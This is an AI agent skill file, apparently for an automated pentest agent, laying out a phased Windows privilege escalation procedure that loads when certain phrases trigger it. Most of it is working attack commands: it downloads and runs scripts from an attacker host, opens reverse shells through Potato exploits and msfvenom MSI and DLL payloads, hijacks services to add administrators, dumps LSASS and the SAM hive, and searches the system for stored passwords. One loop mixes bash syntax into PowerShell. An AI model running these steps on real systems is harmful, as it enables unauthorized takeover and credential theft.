---
name: post-windows-privesc
description: "Windows privilege escalation skill. Token impersonation, unquoted service paths, weak service permissions, AlwaysInstallElevated, credential extraction, and scheduled task abuse. Triggers: 'windows privesc', 'privilege escalation windows', 'local admin', 'seimpersonateprivilege', 'potato exploit', 'winpeas', 'windows priv esc', 'escalate privileges windows'."
---

# Windows Privilege Escalation

Enumerate first — WinPEAS eliminates guesswork. Check whoami /priv immediately.

## Phase 1: Automated Enumeration

```powershell
# WinPEAS (comprehensive)
.\winpeas.exe | Tee-Object -FilePath C:\temp\winpeas.txt

# PowerUp (PowerShell)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://<attacker>/PowerUp.ps1'); Invoke-AllChecks"

# Seatbelt (targeted checks)
.\Seatbelt.exe -group=all

# PrivescCheck
powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://<attacker>/PrivescCheck.ps1'); Invoke-PrivescCheck -Report C:\temp\privesc_report.html -Format HTML"
```

## Phase 2: Quick Baseline

```powershell
whoami /priv           # Check for juicy privileges
whoami /groups         # Group memberships
whoami /all            # Full privilege + group listing
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix"
net localgroup administrators
net user
```

Key privileges to look for:
- `SeImpersonatePrivilege` → Potato exploits
- `SeAssignPrimaryTokenPrivilege` → Potato exploits
- `SeDebugPrivilege` → LSASS dump
- `SeBackupPrivilege` → SAM/SYSTEM copy
- `SeRestorePrivilege` → DLL injection
- `SeTcbPrivilege` → Create privileged token

## Phase 3: Token Impersonation (SeImpersonatePrivilege)

```powershell
# GodPotato (works on Windows 2012-2022)
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators <user> /add"
# Or reverse shell
.\GodPotato-NET4.exe -cmd "cmd /c C:\temp\nc.exe -e cmd <attacker_ip> 4444"

# PrintSpoofer (Windows 10 / Server 2019+)
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -c "powershell -nop -c <base64_payload>"

# JuicyPotato (older systems — requires specific CLSID)
.\JuicyPotato.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd <attacker_ip> 4444" -t * -c "{<CLSID>}"
# CLSID list: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
```

## Phase 4: AlwaysInstallElevated

```powershell
# Check registry keys (both must be 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both = 0x1, create malicious MSI
# On attacker:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi > evil.msi
# On victim:
msiexec /quiet /qn /i C:\temp\evil.msi
```

## Phase 5: Unquoted Service Paths

```powershell
# Find services with unquoted paths containing spaces
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
# Or with PowerUp
Get-UnquotedService

# Example: C:\Program Files\My Service\service.exe
# Place payload at: C:\Program.exe OR C:\Program Files\My.exe
# Then restart service
sc stop <service_name>
sc start <service_name>
# Or reboot if needed
```

## Phase 6: Weak Service Permissions

```powershell
# Check service permissions with accesschk
.\accesschk.exe -uwcqv <current_user> * 2>/dev/null | findstr "RW"
.\accesschk.exe -uwcqv "Authenticated Users" * 2>/dev/null

# Modify service binary path
sc config <service_name> binPath= "cmd /c net localgroup administrators <user> /add"
sc stop <service_name>
sc start <service_name>

# Restore original path after
sc config <service_name> binPath= "C:\original\path\service.exe"
```

## Phase 7: Credential Harvesting

```powershell
# SAM / SYSTEM hive copy (SeBackupPrivilege or admin)
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
# Then offline: secretsdump.py -sam SAM -system SYSTEM LOCAL

# LSASS memory dump
# Task Manager → lsass.exe → Create dump file
# Or via procdump:
.\procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
# Then offline: pypykatz lsa minidump lsass.dmp

# Unattend.xml locations
dir /s /b C:\*.xml 2>nul | findstr /i unattend
type "C:\Windows\Panther\Unattend.xml"
type "C:\Windows\System32\sysprep\Unattend.xml"

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Windows Credential Manager
cmdkey /list
# Run: vault.ps1 or use mimikatz

# Registry credential search
reg query HKLM /f "password" /t REG_SZ /s
reg query HKCU /f "password" /t REG_SZ /s
```

## Phase 8: Scheduled Task Abuse

```powershell
# List scheduled tasks running as SYSTEM
schtasks /query /fo LIST /v | findstr /i "run as\|task name\|task to run"

# Find writable task binary
schtasks /query /fo LIST /v | findstr "Task To Run" | while read path; do
  icacls $path 2>nul | findstr /i "(F) (M) (W)"
done

# Modify task binary
copy C:\temp\payload.exe "C:\path\to\original\task.exe"
# Wait for task execution
```

## Phase 9: DLL Hijacking

```powershell
# Find applications loading non-existent DLLs
# Use Process Monitor with filter: Result = NAME NOT FOUND, Path ends with .dll
procmon.exe  # Filter for missing DLLs

# Common writable DLL locations
# %SystemRoot%\System32\ won't work, but user-writable dirs in PATH will
# Place malicious DLL in writable dir that's in search order before legitimate location

# Compile malicious DLL
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f dll -o evil.dll
```

## Validation (REQUIRED before reporting)

```powershell
whoami /priv  # Must show NT AUTHORITY\SYSTEM or BUILTIN\Administrators
net localgroup administrators  # Confirm user added
```

Document:
1. Starting privilege level (whoami /priv before)
2. Exact exploitation path
3. Evidence of SYSTEM/Administrator access
